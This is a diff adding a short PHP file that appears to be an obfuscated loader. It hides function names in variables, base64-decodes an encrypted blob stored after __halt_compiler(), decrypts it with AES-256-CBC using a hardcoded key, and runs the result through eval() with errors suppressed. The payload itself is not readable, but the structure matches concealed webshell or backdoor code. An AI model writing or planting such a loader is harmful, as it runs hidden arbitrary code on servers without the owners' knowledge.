@@ -1,0 +1,11 @@
+<?php
+if(PHP_SAPI!=='cli-server')@header('Content-Type:text/html;charset=utf-8');
+$x1="strtr";$x2="substr";$x3="file_get_contents";$x4="base64_decode";$x5="openssl_decrypt";$x6="hash";$x7="sha256";
+$p=$x1($x2($x3(__FILE__),__COMPILER_HALT_OFFSET__),"-_~","+/=");
+$p=$x4($p);
+$v=$x2($p,0,16);
+$c=$x2($p,16);
+$k=$x6($x7,'54b85a482ebc7c59fb3db1684d6bcc197ff38ae93080cb5521c04af94067e0cc',true);
+@eval("?>".$x5($c,"AES-256-CBC",$k,OPENSSL_RAW_DATA,$v));
+__halt_compiler();
+2qUGh-iO1YtcBYlXtOk2BK2BM4CZAsBmkOGtC6WYbUWGB1IYwSfX6wqcGQl9qGvuFFCEcnUD7Q8tofMD695g9kWnJVVYSp3i2mfoMiVH5IugTkNDOCjGvW9KzZYIGcbdJNMistPSVGPhSfgSV-H6v-ipbliIyPvIxXOaJjfCDoahq5ITyKRJlwRDTIuP51-P-CPszdecZ6ZG7HNimQUfPE4E7x6fGuN9ZLraJKdq8pmbl2A2xK1yM2LRAtmVbekQxvDCPMQQ9rIHnrjk88v5X24GPxGMvM_zdhu9Zuyg4QL8zZo-UH1Esp8zQgc_xRSTTjCBnum8FemoRdPXIH7Hnu-CapGNthyL1RL4zGttlPU7aBnqJ2EwlLbxyDVCsEEx65exzrWbhBqtmCL4aaW0WdT7Cu8g7hKdh2lLYfmHuc0nf2S186rXU4--YdAMxJXR
